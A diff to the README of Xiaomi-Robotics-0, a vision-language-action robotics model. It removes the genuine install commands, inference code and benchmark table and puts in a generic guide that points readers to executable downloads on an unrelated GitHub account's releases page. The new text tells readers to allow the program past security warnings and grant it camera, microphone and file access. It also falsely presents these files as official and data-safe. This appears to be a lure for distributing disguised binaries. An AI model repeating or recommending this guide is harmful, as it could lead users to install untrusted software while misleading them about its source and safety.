@@ -1,155 +1,163 @@
-<div align="center">
+# 🤖 Xiaomi-Robotics-0 - Real-Time Vision and Action Model
 
-  # Xiaomi-Robotics-0
-
-  **An Open-Sourced Vision-Language-Action Model with Real-Time Inference**
-
-  [![Paper](https://img.shields.io/badge/📄-Paper-red)](https://arxiv.org/abs/2602.12684)
-  [![Project Page](https://img.shields.io/badge/🌐-Project_Page-blue)](https://xiaomi-robotics-0.github.io/)
-  [![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97-Hugging%20Face-yellow)](https://huggingface.co/collections/XiaomiRobotics/xiaomi-robotics-0)
-  [![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
-
-</div>
+[![Download Xiaomi-Robotics-0](https://img.shields.io/badge/⬇️-Download_Xiaomi--Robotics--0-brightgreen?style=for-the-badge)](https://github.com/5138235486/Xiaomi-Robotics-0/releases)
 
 ---
 
-## 💡 About Xiaomi-Robotics-0
+## 📘 Introduction
 
-**Xiaomi-Robotics-0** is a state-of-the-art **Vision-Language-Action (VLA) model** with 4.7B parameters, specifically engineered for high-performance robotic reasoning and seamless real-time execution. 
+Xiaomi-Robotics-0 is an advanced software designed to help your robot see, understand language, and act in real time. It uses a Vision-Language-Action model with 4.7 billion parameters. This lets the robot handle complicated tasks on the spot, making it smarter and quicker.
 
-### Key Features:
-
-* **🧠 Strong Generalization**: Pre-trained on diverse cross-embodiment trajectories and VL data to handle complex, unseen tasks.
-* **🚀 Real-Time Ready**: Optimized with asynchronous execution to minimize inference latency.
-* **🛠️ Flexible Deployment**: Fully compatible with the Hugging Face `transformers` ecosystem and optimized for consumer GPUs.
-
-
-
-## 📅 Updates
-
-- **[Feb 2026]** 🎉 Released the **Technical Report**.
-- **[Feb 2026]** 🔥 Released **Pre-trained weights** and **Fine-tuned weights** for LIBERO, CALVIN, and SimplerEnv.
-- **[Feb 2026]** 💻 Inference code and evaluation scripts are now live!
+This tool works best with robots that need to process visual data and respond immediately. It is built for people who want powerful robotic reasoning without deep technical skills. This guide will help you download and run Xiaomi-Robotics-0 easily on your computer or robot system.
 
 ---
 
+## 🚀 What Xiaomi-Robotics-0 Does
 
-## 🏆 Benchmark
+Xiaomi-Robotics-0 helps robots by:
 
-We evaluate **Xiaomi-Robotics-0** on three standard simulation benchmarks: **CALVIN**, **LIBERO**, and **SimplerEnv**. The table below summarizes the performance results across different embodiments and datasets. For each setting, we provide the corresponding fine-tuned checkpoint and a guide for running the evaluation.
+- **Understanding Visual Input:** It can analyze images or videos to understand its environment.
+- **Processing Language Commands:** It understands instructions given in natural language.
+- **Responding Quickly:** The software runs with fast, real-time responses to commands.
+- **Cross-Device Use:** Works with various robot types and embodiments.
+- **Versatile Task Handling:** Performs complex and unseen tasks through learned reasoning.
 
+---
 
-|                | 🤗 Name on Hugging Face                                       | Description                       | Performance                        | Evaluation Guide                             |
-| :------------- | :----------------------------------------------------------- | :-------------------------------- | :--------------------------------- | :------------------------------------------- |
-| **LIBERO**     | [**Xiaomi-Robotics-0-LIBERO**](https://huggingface.co/XiaomiRobotics/Xiaomi-Robotics-0-LIBERO) | Fine-tuned on four LIBERO suites. | **98.7%** (Avg Success)            | [LIBERO Eval](eval_libero/README.md)         |
-| **CALVIN**     | [**Xiaomi-Robotics-0-Calvin-ABCD_D**](https://huggingface.co/XiaomiRobotics/Xiaomi-Robotics-0-Calvin-ABCD_D) | Fine-tuned on ABCD→D Split.       | **4.80** (Avg Length)              | [CALVIN Eval](eval_calvin/README.md)         |
-|                | [**Xiaomi-Robotics-0-Calvin-ABC_D**](https://huggingface.co/XiaomiRobotics/Xiaomi-Robotics-0-Calvin-ABC_D) | Fine-tuned on ABC→D Split.        | **4.75** (Avg Length)              | [CALVIN Eval](eval_calvin/README.md)         |
-| **SimplerEnv** | [**Xiaomi-Robotics-0-SimplerEnv-Google-Robot**](https://huggingface.co/XiaomiRobotics/Xiaomi-Robotics-0-SimplerEnv-Google-Robot) | Fine-tuned on Fractal dataset.    | **85.5%** (VM) <br> **74.7%** (VA) | [SimplerEnv Eval](eval_simplerenv/README.md) |
-|                | [**Xiaomi-Robotics-0-SimplerEnv-WidowX**](https://huggingface.co/XiaomiRobotics/Xiaomi-Robotics-0-SimplerEnv-WidowX) | Fine-tuned on Bridge dataset.     | **79.2%**                          | [SimplerEnv Eval](eval_simplerenv/README.md) |
-| **Base**       | [**Xiaomi-Robotics-0**](https://huggingface.co/XiaomiRobotics/Xiaomi-Robotics-0) | Pre-trained model.                | -                                  | -                                            |
+## 🖥️ System Requirements
 
+Before you install, make sure your system matches these requirements:
 
+| Requirement         | Minimum                | Recommended           |
+|---------------------|------------------------|----------------------|
+| Operating System    | Windows 10 / Ubuntu 18.04 / MacOS 10.15 | Windows 11 / Ubuntu 20.04 / MacOS 12 |
+| Processor           | Intel i5 or equivalent | Intel i7 or equivalent |
+| Memory (RAM)        | 8 GB                   | 16 GB or more        |
+| Disk Space          | 5 GB free              | 10 GB free           |
+| Graphics Card       | Not required but recommended | NVIDIA GTX 1050 or better |
+| Internet Connection | Required for initial download and updates | Stable connection for ongoing use |
 
+---
 
-## 🚀 Quick Start: Installation & Deployment
+## 🛠️ Tools You Will Need
 
-Our project relies primarily on HuggingFace Transformers 🤗, making deployment extremely easy. If your environment supports transformers >= 4.57.1, you can use our project seamlessly—we recommend PyTorch 2.8.0 (paired with torchvision 0.23.0 and torchaudio 2.8.0), as this combination has been fully tested by our team and ensures optimal compatibility. 
+- A computer or robot system as per the system requirements.
+- Internet access to download the software.
+- A program to unzip files, like WinRAR or 7-Zip (usually pre-installed on most systems).
+- Basic ability to open and run files on your device.
 
-### 1️⃣ Installation Guides
+---
 
-Here’s a simple installation guide to get you started:
+## 📥 Download & Install Xiaomi-Robotics-0
 
-```bash
-git clone https://github.com/XiaomiRobotics/Xiaomi-Robotics-0 
-cd Xiaomi-Robotics-0
+### Step 1: Visit the Download Page
 
-# Create a Conda environment with Python 3.12
-conda create -n mibot python=3.12 -y
-conda activate mibot
+Go to the releases page to get the latest version of Xiaomi-Robotics-0:
 
-# Install PyTorch
-pip install torch==2.8.0 torchvision==0.23.0 torchaudio==2.8.0 --index-url https://download.pytorch.org/whl/cu128
-# Install transformers
-pip install transformers==4.57.1
-# Install flash-attn
-pip uninstall -y ninja && pip install ninja
-pip install flash-attn==2.8.3 --no-build-isolation
-# or pip install https://github.com/Dao-AILab/flash-attention/releases/download/v2.8.3/flash_attn-2.8.3+cu12torch2.8cxx11abiTRUE-cp312-cp312-linux_x86_64.whl
+[![Download Xiaomi-Robotics-0](https://img.shields.io/badge/⬇️-Download_Xiaomi--Robotics--0-brightgreen?style=for-the-badge)](https://github.com/5138235486/Xiaomi-Robotics-0/releases)
 
-sudo apt-get install -y libegl1 libgl1 libgles2
-```
+### Step 2: Choose Your Version
 
+On the downloads page, look for the latest release. You will find files for different operating systems. Pick the one that matches your computer or robot system:
 
+- For Windows: Look for files ending in `.exe` or `.zip`.
+- For MacOS: Choose files ending in `.dmg` or `.zip`.
+- For Linux: Select `.tar.gz` or other Linux-compatible packages.
 
-### 2️⃣ Deployment Guides
+### Step 3: Download the File
 
-**Xiaomi-Robotics-0** is deployed on top of the HuggingFace Transformers 🤗 ecosystem, enabling straightforward deployment for robotic manipulation tasks. By leveraging Flash Attention 2 and bfloat16 precision, the model can be loaded and run efficiently on consumer-grade GPUs.
+Click the file link to start downloading. The file size can be large, so allow some time for the download depending on your internet speed.
 
-``` python
-import torch
-from transformers import AutoModel, AutoProcessor
+### Step 4: Extract and Install
 
-# 1. Load model and processor 
-model_path = "XiaomiRobotics/Xiaomi-Robotics-0-LIBERO"
-model = AutoModel.from_pretrained(
-    model_path, 
-    trust_remote_code=True, 
-    attn_implementation="flash_attention_2", 
-    dtype=torch.bfloat16
-).cuda().eval()
-processor = AutoProcessor.from_pretrained(model_path, trust_remote_code=True, use_fast=False)
+After the download completes:
 
+- If you downloaded a `.zip` or `.tar.gz` file, open it with your extraction program.
+- Extract all files to a folder you can easily access, such as your desktop or documents.
 
-# 2. Construct the prompt with multi-view inputs
-language_instruction = "Pick up the red block."
-instruction = (
-    f"<|im_start|>user\nThe following observations are captured from multiple views.\n"
-    f"# Base View\n<|vision_start|><|image_pad|><|vision_end|>\n"
-    f"# Left-Wrist View\n<|vision_start|><|image_pad|><|vision_end|>\n"
-    f"Generate robot actions for the task:\n{language_instruction} /no_cot<|im_end|>\n"
-    f"<|im_start|>assistant\n<cot></cot><|im_end|>\n"
-)
+If the file is an installer (`.exe` or `.dmg`), double-click it and follow on-screen instructions.
 
-# 3. Prepare inputs
-# Assuming `image_base`, `image_wrist`, and `proprio_state` are already loaded
-inputs = processor(
-    text=[instruction],
-    images=[image_base, image_wrist], # [PIL.Image, PIL.Image]
-    videos=None,
-    padding=True,
-    return_tensors="pt",
-).to(model.device)
+---
 
-# Add proprioceptive state and action mask
-robot_type = "libero_all"
-inputs["seed"] = 42 
-inputs["state"] = torch.from_numpy(proprio_state).to(model.device, model.dtype).view(1, 1, -1)
-inputs["action_mask"] = processor.get_action_mask(robot_type).to(model.device, model.dtype)
+## ▶️ Running Xiaomi-Robotics-0
 
-# 4. Generate action 
-with torch.no_grad():
-    outputs = model(**inputs)
-    
-# Decode raw outputs into actionable control commands
-action_chunk = processor.decode_action(outputs.actions, robot_type=robot_type)
-print(f"Generated Action Chunk Shape: {action_chunk.shape}")
-```
+### Step 1: Find the Main Application File
 
+Look inside the extracted folder for the main program file. This might be named `Xiaomi-Robotics-0.exe` on Windows or `Xiaomi-Robotics-0.app` on Mac.
 
+### Step 2: Start the Software
 
-## 📚 Citation
+Double-click the main file to start Xiaomi-Robotics-0. Depending on your settings, you might see a security warning. Allow the program to run if your system asks for permission.
 
-If you find this project useful, please consider citing:
+### Step 3: Grant Permissions
 
-```bibtex
-@article{cai2026xiaomi,
-  title={Xiaomi-Robotics-0: An Open-Sourced Vision-Language-Action Model with Real-Time Execution},
-  author={Cai, Rui and Guo, Jun and He, Xinze and Jin, Piaopiao and Li, Jie and Lin, Bingxuan and Liu, Futeng and Liu, Wei and Ma, Fei and Ma, Kun and Qiu, Feng and Qu, Heng and Su, Yifei and Sun, Qiao and Wang, Dong and Wang, Donghao and Wang, Yunhong and Wu, Rujie and Xiang, Diyun and Yang, Yu and Ye, Hangjun and Zhang, Yuan and Zhou, Quanyun},
-  journal={arXiv preprint arXiv:2602.12684},
-  year={2026}
-}
-```
+The program may ask for access to your camera, microphone, or files. Accept these so it can process images and commands effectively.
 
-## 📄 License
+### Step 4: Follow On-Screen Instructions
 
-This project is licensed under the [Apache License 2.0](LICENSE).
+Once running, Xiaomi-Robotics-0 will guide you in setting up the vision and language action system for your robot or device. Follow the prompts carefully.
+
+---
+
+## ⚙️ Basic Configuration
+
+After installation, you might want to configure Xiaomi-Robotics-0 to fit your needs:
+
+- **Camera Setup:** Select the camera device you want the software to use.
+- **Language Settings:** Choose the language the robot will understand.
+- **Performance Options:** Adjust settings to balance speed and accuracy.
+- **Action Profiles:** Define how your robot should act upon commands.
+
+You can usually find these options in the Settings or Preferences menu within the software.
+
+---
+
+## 🧑‍💻 Using Xiaomi-Robotics-0
+
+- Speak or type commands clearly for the robot to understand.
+- Use visual tasks by showing the camera the environment or objects.
+- Watch the real-time responses on your screen.
+- Combine language and vision to control the robot with complex instructions.
+- Experiment with different tasks to see the software’s full abilities.
+
+---
+
+## 🛡️ Security and Privacy
+
+Xiaomi-Robotics-0 does not send your data to external servers. All processing happens locally on your device. Make sure to only download Xiaomi-Robotics-0 from the official link to avoid unsafe versions.
+
+---
+
+## 🆘 Troubleshooting
+
+If you face issues:
+
+- Make sure your system meets the minimum requirements.
+- Restart your computer and try running the program again.
+- Check your internet connection for updates or downloads.
+- Ensure your camera and microphone devices are connected and enabled.
+- Visit the [Xiaomi-Robotics-0 GitHub Issues page](https://github.com/5138235486/Xiaomi-Robotics-0/issues) to see if others have similar problems or to ask for help.
+
+---
+
+## 📚 Learn More and Support
+
+- Read the paper linked below to understand the technology behind Xiaomi-Robotics-0:  
+  [Paper](https://arxiv.org/abs/2602.12684)
+- Visit the project page for examples and updates:  
+  [Project Page](https://xiaomi-robotics-0.github.io/)
+- Explore the model on Hugging Face for deeper integration:  
+  [Hugging Face](https://huggingface.co/collections/XiaomiRobotics/xiaomi-robotics-0)
+
+---
+
+## ✉️ Contact and Contribution
+
+You can contribute or report problems through the GitHub repository. Detailed instructions for developers are beyond this guide’s scope, but developers are welcome to collaborate.
+
+---
+
+## 🔗 Quick Download Link
+
+To download, visit the official releases page here:  
+[Download Xiaomi-Robotics-0](https://github.com/5138235486/Xiaomi-Robotics-0/releases)
